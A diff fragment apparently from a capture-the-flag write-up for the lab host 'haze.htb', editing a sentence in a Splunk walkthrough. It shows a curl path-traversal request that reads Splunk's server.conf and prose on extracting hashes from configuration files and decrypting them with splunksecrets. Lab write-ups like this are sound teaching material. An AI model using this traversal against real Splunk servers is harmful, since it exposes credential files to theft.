@@ -20,7 +20,7 @@ curl -s 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C
 curl -s 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/system/local/server.conf'
 ```
 
-authentication.conf will give you a first and last name, the others file will give you three hashes. Use splunksecrets tool to decrypt them.
+authentication.conf will give you first and last name from an user, the other files will give you three hashes. Use splunksecrets tool to decrypt them.
 
 ```bash
 
